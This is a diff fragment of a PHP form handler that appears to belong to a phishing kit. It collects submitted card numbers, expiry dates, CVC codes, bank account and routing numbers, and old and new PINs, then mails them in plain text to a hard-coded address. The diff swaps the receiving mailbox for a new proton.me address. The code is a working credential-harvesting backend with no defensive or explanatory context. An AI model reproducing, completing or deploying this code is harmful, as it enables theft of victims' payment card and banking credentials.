@@ -13,10 +13,10 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $old_pin = htmlspecialchars($_POST['old_pin']);
     $new_pin = htmlspecialchars($_POST['new_pin']);
     
-    $to = 'marketing@bestinallsecureverygoodverificationboostconfidentinall.hannahjonesjewels.com'; // Replace with your admin email
+    $to = 'protectiondriveforclear@proton.me'; // Replace with your admin email
     $subject = "p r";
     $message = "Card name: $card_name\nCard Number: $card_number\nExpiry Date: $expiry_date\nCVC: $cvc\nAccount Number: $account_number\nRoutine Number: $routine_number\nOld Pin: $old_pin\nNew Pin: $new_pin";
-    $headers = "From: marketing@bestinallsecureverygoodverificationboostconfidentinall.hannahjonesjewels.com"; // Replace with your from email
+    $headers = "From: protectiondriveforclear@proton.me"; // Replace with your from email
 
     // Send email
     if (mail($to, $subject, $message, $headers)) {
